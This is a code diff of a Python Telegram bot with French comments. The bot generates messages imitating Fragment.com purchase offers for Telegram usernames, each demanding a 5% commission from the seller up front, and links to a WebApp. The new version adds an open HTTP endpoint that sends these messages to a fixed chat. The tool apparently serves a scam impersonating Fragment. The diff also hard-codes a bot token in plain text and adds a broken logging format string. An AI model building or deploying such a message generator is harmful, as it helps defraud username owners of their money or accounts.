@@ -1,5 +1,6 @@
 import logging
 import os
+import json
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -7,9 +8,7 @@ from telegram.ext import (
     CommandHandler, 
     MessageHandler, 
     filters, 
-    ContextTypes, 
-    ConversationHandler,
-    CallbackQueryHandler
+    ContextTypes
 )
 from telegram.error import Conflict, NetworkError
 import asyncio
@@ -20,25 +19,22 @@ import time
 
 # Configuration du logging
 logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(name)s - %(levelName)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# États de conversation
-USERNAME_INPUT, PRICE_INPUT = range(2)
-
 # Configuration
-BOT_TOKEN = os.getenv('BOT_TOKEN', '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c')
-WEBAPP_URL = os.getenv('WEBAPP_URL', 'https://telegram-bot-vic3.onrender.com')
+BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
+FIXED_CHAT_ID = 511758924
 PORT = int(os.getenv('PORT', 10000))
 
-print(f"🔍 DEBUG: BOT_TOKEN configuré: {'✅' if BOT_TOKEN else '❌'}")
-print(f"🔍 DEBUG: WEBAPP_URL: {WEBAPP_URL}")
+print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
+print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")
 print(f"🔍 DEBUG: PORT: {PORT}")
 
-# Variables globales pour stocker les données
-user_data = {}
+# Variables globales pour l'app Telegram
+telegram_app = None
 
 # ===== FONCTION PRIX TON =====
 async def get_ton_price():
@@ -48,176 +44,29 @@ async def get_ton_price():
             async with session.get("https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000", timeout=5) as response:
                 if response.status == 200:
                     data = await response.json()
-                    return float(data.get('Price', 5.50))  # Prix en USD
+                    return float(data.get('Price', 5.50))
                 else:
                     logger.warning(f"Erreur API DIA: {response.status}")
-                    return 5.50  # Fallback
+                    return 5.50
     except Exception as e:
         logger.warning(f"Erreur récupération prix TON: {e}")
-        return 5.50  # Fallback en cas d'erreur
+        return 5.50
 
-# ===== SERVEUR DE SANTÉ =====
-class HealthHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == '/health' or self.path == '/':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/plain')
-            self.end_headers()
-            self.wfile.write(b'OK - Fragment Deal Bot is running')
-        else:
-            self.send_response(404)
-            self.end_headers()
-
-    def log_message(self, format, *args):
-        # Supprime les logs HTTP pour éviter le spam
-        pass
-
-def start_health_server():
-    """Démarrage du serveur de santé - OBLIGATOIRE pour Render"""
+# ===== FONCTION GÉNÉRATION MESSAGE =====
+async def generate_fragment_message(username, price):
+    """Génère le message Fragment avec calculs en temps réel"""
     try:
-        server = HTTPServer(('0.0.0.0', PORT), HealthHandler)
-        print(f"🏥 Serveur de santé démarré sur port {PORT}")
-        server.serve_forever()
-    except Exception as e:
-        print(f"⚠️  Erreur serveur de santé: {e}")
-        # Si le port est occupé, essaye un port alternatif
-        try:
-            alt_port = PORT + 1
-            server = HTTPServer(('0.0.0.0', alt_port), HealthHandler)
-            print(f"🏥 Serveur de santé démarré sur port alternatif {alt_port}")
-            server.serve_forever()
-        except Exception as e2:
-            print(f"❌ Impossible de démarrer le serveur de santé: {e2}")
-
-# ===== GESTIONNAIRES TELEGRAM =====
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Gestionnaire de commande /start - Demande directement le username"""
-    user = update.effective_user
-    
-    await update.message.reply_text(
-        f"Hello {user.first_name} 👋\n\n"
-        "💎 **Fragment Username Deal**\n\n"
-        "Please send me the **Fragment username** you want to sell.\n\n"
-        "📝 **Format:** Just the name (without @ or .ton)\n"
-        "📝 **Example:** `crypto` or `defi`\n\n"
-        "❌ **Cancel:** /cancel",
-        parse_mode='Markdown'
-    )
-    return USERNAME_INPUT
-
-async def newdeal(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Démarrer un nouveau deal (fonction alternative)"""
-    keyboard = [
-        [InlineKeyboardButton("🚀 Start Deal", callback_data='start_deal')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        "💎 **Fragment Username Deal Bot**\n\n"
-        "Ready to create a deal for a Fragment username?\n\n"
-        "Click the button below to get started! 👇",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
-    )
-
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gestionnaire des boutons callback"""
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == 'start_deal':
-        await query.edit_message_text(
-            "💎 **Fragment Username Deal**\n\n"
-            "Please send me the **Fragment username** you want to sell.\n\n"
-            "📝 **Format:** Just the name (without @ or .ton)\n"
-            "📝 **Example:** `crypto` or `defi`\n\n"
-            "❌ **Cancel:** /cancel",
-            parse_mode='Markdown'
-        )
-        return USERNAME_INPUT
-    
-    return ConversationHandler.END
-
-async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Récupérer le nom d'utilisateur"""
-    username = update.message.text.strip().lower()
-    user_id = update.effective_user.id
-    
-    # Validation simple du nom d'utilisateur
-    if len(username) < 2:
-        await update.message.reply_text(
-            "❌ **Invalid username**\n\n"
-            "Username must be at least 2 characters long.\n"
-            "Please try again:"
-        )
-        return USERNAME_INPUT
-    
-    if not username.replace('_', '').replace('-', '').isalnum():
-        await update.message.reply_text(
-            "❌ **Invalid username**\n\n"
-            "Username can only contain letters, numbers, hyphens and underscores.\n"
-            "Please try again:"
-        )
-        return USERNAME_INPUT
-    
-    # Stocker les données utilisateur
-    user_data[user_id] = {'username': username}
-    
-    await update.message.reply_text(
-        f"✅ **Username saved:** `{username}`\n\n"
-        "💰 Now please enter the **price in TON**\n\n"
-        "📝 **Examples:** `1000`, `500.5`, `250`\n"
-        "💎 **Note:** Price should be the total amount in TON",
-        parse_mode='Markdown'
-    )
-    
-    return PRICE_INPUT
-
-async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Récupérer le prix et générer directement le message"""
-    try:
-        price = float(update.message.text.strip())
-        user_id = update.effective_user.id
-        
-        if price <= 0:
-            await update.message.reply_text(
-                "❌ **Invalid price**\n\n"
-                "Price must be greater than 0.\n"
-                "Please enter a valid price in TON:"
-            )
-            return PRICE_INPUT
-        
-        if price > 1000000:  # Limite raisonnable
-            await update.message.reply_text(
-                "❌ **Price too high**\n\n"
-                "Maximum price is 1,000,000 TON.\n"
-                "Please enter a reasonable price:"
-            )
-            return PRICE_INPUT
-        
-        # Mise à jour des données utilisateur
-        if user_id in user_data:
-            user_data[user_id]['price'] = price
-            username = user_data[user_id]['username']
-        else:
-            await update.message.reply_text(
-                "❌ **Error:** Username not found.\n"
-                "Please start over with /start"
-            )
-            return ConversationHandler.END
-        
-        # Calculs avec prix TON en temps réel
+        # Calculs
         commission = price * 0.05
-        ton_to_usd = await get_ton_price()  # Prix en temps réel
+        ton_to_usd = await get_ton_price()
         price_usd = price * ton_to_usd
         commission_usd = commission * ton_to_usd
         
-        # Message de simulation Fragment avec wallet cliquable intégré
-        deal_message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:
+        # Message personnalisé
+        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:
 
-**• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
-• Commission: 💎{commission:g} (${commission_usd:.2f} USD)**
+**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
+• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**
 
 Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
 
@@ -229,117 +78,259 @@ Additional Information:
 Important:
 **• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message.**"""
-        
-        # Bouton vers la mini-app
-        keyboard = [[InlineKeyboardButton("View details", url=f"https://myminiapp.onrender.com/?user={username}_deal&price={price:g}")]]
+
+        # Bouton vers WebApp (corrigé)
+        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
+        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await update.message.reply_text(
-            deal_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
+        return message, reply_markup
         
-        # Nettoyage des données temporaires
-        del user_data[user_id]
-        
-        return ConversationHandler.END
-        
-    except ValueError:
-        await update.message.reply_text(
-            "❌ **Invalid price format**\n\n"
-            "Please enter a valid number.\n"
-            "📝 **Examples:** `1000`, `500.5`, `250`"
-        )
-        return PRICE_INPUT
+    except Exception as e:
+        logger.error(f"Erreur génération message: {e}")
+        return None, None
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Annuler la conversation"""
-    user_id = update.effective_user.id
+# ===== SERVEUR HTTP =====
+class MessageBotHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/health' or self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            self.wfile.write(b'OK - Message Bot is running')
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_OPTIONS(self):
+        """Gestion CORS preflight"""
+        self.send_response(200)
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        self.end_headers()
+
+    def do_POST(self):
+        """Gestion des requêtes POST pour envoyer des messages"""
+        try:
+            if self.path == '/send-message':
+                # Headers CORS
+                self.send_header('Access-Control-Allow-Origin', '*')
+                self.send_header('Content-Type', 'application/json')
+                
+                # Lecture des données
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+                data = json.loads(post_data.decode('utf-8'))
+                
+                username = data.get('username', '').strip()
+                price = float(data.get('price', 0))
+                
+                if not username or price <= 0:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(json.dumps({
+                        'success': False, 
+                        'error': 'Username et price requis'
+                    }).encode())
+                    return
+                
+                # Envoi du message via le bot Telegram
+                success = asyncio.run(self.send_telegram_message(username, price))
+                
+                if success:
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(json.dumps({
+                        'success': True, 
+                        'message': f'Message envoyé pour {username}'
+                    }).encode())
+                else:
+                    self.send_response(500)
+                    self.end_headers()
+                    self.wfile.write(json.dumps({
+                        'success': False, 
+                        'error': 'Erreur envoi Telegram'
+                    }).encode())
+            else:
+                self.send_response(404)
+                self.end_headers()
+                
+        except Exception as e:
+            logger.error(f"Erreur POST: {e}")
+            self.send_response(500)
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                'success': False, 
+                'error': str(e)
+            }).encode())
+
+    async def send_telegram_message(self, username, price):
+        """Envoie le message via l'application Telegram"""
+        try:
+            global telegram_app
+            if telegram_app is None:
+                return False
+                
+            message, reply_markup = await generate_fragment_message(username, price)
+            
+            if message and reply_markup:
+                await telegram_app.bot.send_message(
+                    chat_id=FIXED_CHAT_ID,
+                    text=message,
+                    reply_markup=reply_markup,
+                    parse_mode='Markdown'
+                )
+                logger.info(f"✅ Message envoyé pour {username} - {price} TON")
+                return True
+            else:
+                logger.error("❌ Erreur génération message")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ Erreur envoi Telegram: {e}")
+            return False
+
+    def log_message(self, format, *args):
+        # Supprime les logs HTTP pour éviter le spam
+        pass
+
+# ===== COMMANDES TELEGRAM =====
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Commande /start"""
+    user = update.effective_user
+    chat_id = update.effective_chat.id
     
-    # Nettoyage des données
-    if user_id in user_data:
-        del user_data[user_id]
+    message = f"""🤖 **Message Bot Fragment**
+
+Bonjour {user.first_name}! 
+
+📱 **Votre Chat ID:** `{chat_id}`
+
+Ce bot génère automatiquement des messages Fragment personnalisés via l'interface web.
+
+**Commandes disponibles:**
+• `/test username price` - Tester un message
+• `/help` - Aide
+
+💎 **Prêt à recevoir vos deals!**"""
     
-    await update.message.reply_text(
-        "❌ **Operation cancelled**\n\n"
-        "Use /start to create a new deal anytime! 👋",
-        parse_mode='Markdown'
-    )
-    
-    return ConversationHandler.END
+    await update.message.reply_text(message, parse_mode='Markdown')
+
+async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Commande de test /test username price"""
+    try:
+        if len(context.args) != 2:
+            await update.message.reply_text(
+                "❌ **Usage:** `/test username price`\n"
+                "📝 **Exemple:** `/test crypto 1000`",
+                parse_mode='Markdown'
+            )
+            return
+            
+        username = context.args[0].strip().lower()
+        price = float(context.args[1])
+        
+        if price <= 0:
+            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
+            return
+            
+        # Génération du message
+        message, reply_markup = await generate_fragment_message(username, price)
+        
+        if message and reply_markup:
+            await update.message.reply_text(
+                message,
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+            await update.message.reply_text(
+                f"✅ **Test réussi!**\n"
+                f"👤 Username: {username}\n"
+                f"💰 Prix: {price} TON",
+                parse_mode='Markdown'
+            )
+        else:
+            await update.message.reply_text("❌ Erreur lors de la génération du message")
+            
+    except ValueError:
+        await update.message.reply_text("❌ Format de prix invalide")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Erreur: {str(e)}")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Commande d'aide"""
     help_text = """
-🤖 **Fragment Deal Bot - Help**
+🤖 **Message Bot Fragment - Aide**
 
-**Available Commands:**
-• `/start` - Create a new Fragment username deal
-• `/help` - Show this help message
-• `/cancel` - Cancel current operation
+**Commandes disponibles:**
+• `/start` - Informations et Chat ID
+• `/test username price` - Tester un message
+• `/help` - Cette aide
 
-**How it works:**
-1. 🚀 Use `/start` to begin
-2. 📝 Enter Fragment username  
-3. 💰 Set price in TON
-4. 🔗 Get your deal message instantly
+**Utilisation via API:**
+POST /send-message
+{
+"username": "crypto",
+"price": 1000
+}
 
-💎 **Ready to start?** Use `/start`
+**Fonctionnalités:**
+✅ Messages Fragment automatiques
+✅ Calcul prix TON en temps réel  
+✅ Boutons WebApp intégrés
+✅ Chat ID fixe configuré
+
+💎 **Bot prêt à l'emploi!**
     """
     
     await update.message.reply_text(help_text, parse_mode='Markdown')
 
-# ===== FONCTION PRINCIPALE =====
-
-def main():
-    """Fonction principale - Mode Polling uniquement"""
+# ===== SERVEUR =====
+def start_server():
+    """Démarre le serveur HTTP"""
     try:
-        # Serveur de santé simple pour Render
-        health_thread = Thread(target=start_health_server, daemon=True)
-        health_thread.start()
+        server = HTTPServer(('0.0.0.0', PORT), MessageBotHandler)
+        print(f"🌐 Serveur HTTP démarré sur port {PORT}")
+        server.serve_forever()
+    except Exception as e:
+        print(f"❌ Erreur serveur HTTP: {e}")
+
+# ===== FONCTION PRINCIPALE =====
+def main():
+    """Fonction principale"""
+    global telegram_app
+    
+    try:
+        # Serveur HTTP en arrière-plan
+        server_thread = Thread(target=start_server, daemon=True)
+        server_thread.start()
         
-        # Création de l'application
-        application = Application.builder().token(BOT_TOKEN).build()
-        
-        # Gestionnaire de conversation
-        conv_handler = ConversationHandler(
-            entry_points=[
-                CommandHandler('start', start),
-                CommandHandler('newdeal', newdeal),
-                CallbackQueryHandler(button_callback, pattern='^start_deal$')
-            ],
-            states={
-                USERNAME_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
-                PRICE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)]
-            },
-            fallbacks=[CommandHandler('cancel', cancel)],
-            per_message=False,
-            per_chat=True,
-            per_user=True
-        )
+        # Application Telegram
+        telegram_app = Application.builder().token(BOT_TOKEN).build()
         
         # Ajout des gestionnaires
-        application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(conv_handler)
+        telegram_app.add_handler(CommandHandler("start", start_command))
+        telegram_app.add_handler(CommandHandler("test", test_command))
+        telegram_app.add_handler(CommandHandler("help", help_command))
         
-        print("🚀 Fragment Deal Bot démarré...")
-        print("💎 Mode: TON avec prix temps réel")
-        print("🏥 Serveur de santé: Activé")
-        print("🔄 Mode: Polling (Compatible Render)")
+        print("🚀 Message Bot Fragment démarré...")
+        print(f"💎 Chat ID fixe: {FIXED_CHAT_ID}")
+        print(f"🔗 WebApp: BidRequestWebApp_bot/WebApp")
+        print("🌐 Serveur HTTP: Actif")
+        print("🔄 Mode: Polling")
         
-        # MODE POLLING UNIQUEMENT - Fonctionne partout
-        application.run_polling(
+        # Démarrage en polling
+        telegram_app.run_polling(
             drop_pending_updates=True,
-            allowed_updates=['message', 'callback_query']
+            allowed_updates=['message']
         )
         
-    except Conflict:
-        print("⚠️  Autre instance détectée, redémarrage en cours...")
-        time.sleep(5)
-        main()  # Retry
     except Exception as e:
-        print(f"❌ Erreur lors du démarrage: {e}")
+        print(f"❌ Erreur démarrage: {e}")
         raise
 
 if __name__ == '__main__':
